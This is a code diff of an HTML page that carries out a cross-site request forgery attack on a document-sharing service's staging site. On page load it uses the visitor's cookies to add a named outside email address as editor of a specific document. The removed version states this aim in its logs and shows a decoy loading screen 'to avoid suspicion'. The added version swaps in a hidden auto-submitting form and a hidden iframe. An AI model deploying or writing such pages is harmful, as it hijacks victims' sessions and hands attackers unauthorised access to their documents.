@@ -2,128 +2,39 @@
 <html>
 <body>
     <script>
-    // Execute immediately on page load
-    (async function() {
-        // Show loading to avoid suspicion
-        document.body.innerHTML = `
-            <div style="padding: 50px; text-align: center; font-family: Arial;">
-                <h2>🔄 Loading Document Collaboration...</h2>
-                <p>Please wait while we set up document sharing.</p>
-            </div>
-        `;
+    // Execute immediately
+    (function() {
+        // Create hidden iframe for responses
+        const iframe = document.createElement('iframe');
+        iframe.name = 'hiddenFrame';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
         
-        console.log('Starting CSRF attack to add attacker as editor...');
+        // Create and submit form for adding editor
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://staging.textjam.com/api/doc/KAM7CN17/access/collaborator/editor';
+        form.target = 'hiddenFrame';
+        form.style.display = 'none';
         
-        // Step 1: Call /tool/share/button endpoint
-        try {
-            console.log('Step 1: Calling /tool/share/button...');
-            const shareResponse = await fetch('https://staging.textjam.com/doc/KAM7CN17/tool/share/button', {
-                method: 'POST',
-                credentials: 'include',  // This sends cookies automatically
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'Origin': 'https://textjam.com',
-                    'Referer': 'https://textjam.com/doc/KAM7CN17'
-                },
-                body: JSON.stringify({
-                    data: {},
-                    clientId: 31
-                })
-            });
-            
-            console.log('Share button response status:', shareResponse.status);
-            
-            // Try to read the response
-            try {
-                const shareData = await shareResponse.text();
-                console.log('Share button response:', shareData);
-            } catch(e) {}
-            
-        } catch(error) {
-            console.error('Share button error:', error);
-        }
+        // Add the email field
+        const emailInput = document.createElement('input');
+        emailInput.type = 'hidden';
+        emailInput.name = 'email';
+        emailInput.value = 'rathnaitsergey692@gmail.com';
+        form.appendChild(emailInput);
         
-        // Small delay to simulate real user interaction
-        await new Promise(resolve => setTimeout(resolve, 300));
+        // Add to page and submit
+        document.body.appendChild(form);
+        form.submit();
         
-        // Step 2: Add collaborator as EDITOR (not none)
-        try {
-            console.log('Step 2: Adding collaborator as "editor"...');
-            const collaboratorResponse = await fetch('https://staging.textjam.com/doc/KAM7CN17/access/collaborator/editor', {
-                method: 'POST',
-                credentials: 'include',  // Sends cookies
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'Origin': 'https://textjam.com',
-                    'Referer': 'https://textjam.com/doc/KAM7CN17'
-                },
-                body: JSON.stringify({
-                    email: 'rathnaitsergey692@gmail.com'
-                })
-            });
-            
-            console.log('Collaborator response status:', collaboratorResponse.status);
-            console.log('Collaborator response status text:', collaboratorResponse.statusText);
-            
-            // Try to read response
-            try {
-                const collabData = await collaboratorResponse.text();
-                console.log('Collaborator response data:', collabData);
-                
-                // Parse JSON if possible
-                if (collabData) {
-                    try {
-                        const jsonData = JSON.parse(collabData);
-                        console.log('Parsed JSON response:', jsonData);
-                    } catch(e) {
-                        console.log('Response is not JSON:', collabData.substring(0, 200));
-                    }
-                }
-                
-                // Check if successful
-                if (collaboratorResponse.ok) {
-                    console.log('🎉 SUCCESS! Attacker added as editor!');
-                    document.body.innerHTML = `
-                        <div style="padding: 50px; text-align: center; font-family: Arial; color: green;">
-                            <h2>✅ Successfully added as editor!</h2>
-                            <p>You now have editor access to document KAM7CN17</p>
-                        </div>
-                    `;
-                } else {
-                    console.log('❌ Failed to add as editor');
-                    document.body.innerHTML = `
-                        <div style="padding: 50px; text-align: center; font-family: Arial; color: red;">
-                            <h2>❌ Failed to add editor</h2>
-                            <p>Status: ${collaboratorResponse.status} ${collaboratorResponse.statusText}</p>
-                        </div>
-                    `;
-                }
-                
-            } catch(e) {
-                console.error('Error reading response:', e);
-            }
-            
-        } catch(error) {
-            console.error('Collaborator request error:', error);
-            document.body.innerHTML = `
-                <div style="padding: 50px; text-align: center; font-family: Arial; color: red;">
-                    <h2>❌ Request Failed</h2>
-                    <p>Error: ${error.message}</p>
-                </div>
-            `;
-        }
-        
-        // Redirect to the document page after 3 seconds
+        // Clean up and redirect
         setTimeout(() => {
-            console.log('Redirecting to document...');
-            window.location.href = 'https://staging.textjam.com/doc/KAM7CN17?shared=true';
-        }, 3000);
-        
+            document.body.removeChild(form);
+            document.body.removeChild(iframe);
+            window.location.href = 'https://staging.textjam.com/doc/KAM7CN17?editor_added=true';
+        }, 1000);
     })();
     </script>
 </body>
 </html>
-
-
